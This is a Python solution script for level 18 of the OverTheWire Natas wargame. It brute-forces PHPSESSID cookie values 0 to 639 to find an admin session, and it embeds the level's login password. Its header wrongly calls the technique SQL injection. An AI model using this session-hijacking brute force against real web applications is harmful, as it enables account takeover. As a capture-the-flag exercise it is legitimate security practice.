#!/bin/python3.9
# natas sqli to brute force passwords

import requests
import re


url = "http://natas18.natas.labs.overthewire.org"
username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
auth = (username, password)

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'



def authorization_test():
    get_auth = requests.get(url, auth=(username,password))

    s = '<h1>Unauthorized'
    response_check = re.search(s, get_auth.text)
    #print(response_check)
    
    if (str(response_check) != 'None'): 
        print('Authorization failed. Username, password, or url incorrect')
        exit()
    else:
        print('Authentication successful, continuing with exploit.')



def cookie_brute(range_max):
    print("\nBrute forcing the PHPSESSID.\n")
    for i in range(0,range_max):
            cookies = dict(PHPSESSID=str(i))
            payload = dict(username='raccoon',password='raccoon')
            r = requests.post(url, auth=auth, data=payload, cookies=cookies)
            
            s = 'You are logged in as a regular user.'
            response_check = re.search(s, r.text)

            if (str(response_check) == 'None'): 
                print(r.text)




            

if __name__ == '__main__':
    authorization_test()
    cookie_brute(640)